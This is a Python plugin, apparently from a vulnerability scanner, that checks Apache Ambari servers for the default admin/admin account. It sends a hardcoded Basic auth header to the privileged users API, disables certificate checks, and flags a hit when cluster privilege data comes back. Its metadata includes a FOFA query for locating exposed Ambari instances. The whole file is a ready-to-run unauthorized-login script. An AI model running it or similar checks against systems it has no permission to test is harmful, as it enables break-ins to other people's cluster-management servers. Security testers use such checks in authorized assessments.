#coding:utf-8
import requests
import requests.packages.urllib3
requests.packages.urllib3.disable_warnings()
import re
def msg():
  ret = {

      'links'     :  '',

      'huixian'   :  '',

      'method'    :   'get',

      'bugname'   :   'Apache Ambari默认账号密码',

      'level'     :   'critical',

      'FOFA'      :   'app="APACHE-Ambari"',

      'author'    :   'ppxfx',

      'ifbug'     :   False,
  }
  return ret
def run(url,ua):
  ret = msg()
  headers = {
      'User-Agent': ua,
      'Authorization': 'Basic YWRtaW46YWRtaW4=',
      }
  target = '/api/v1/users/admin?fields=*,privileges/PrivilegeInfo/cluster_name,privileges/PrivilegeInfo/permission_name'
  url1 = url + target
  ret['url'] = url1
  try:
    res=requests.get(url=url1,headers=headers,timeout=5,verify=False)
    if res.status_code == 200 and 'PrivilegeInfo' in res.text and 'AMBARI.' in res.text:
      ret['huixian'] = '账号/密码：admin/admin'
      res.close()
      ret['ifbug'] = True
      return ret
    else:
      return ret
  except:
    return ret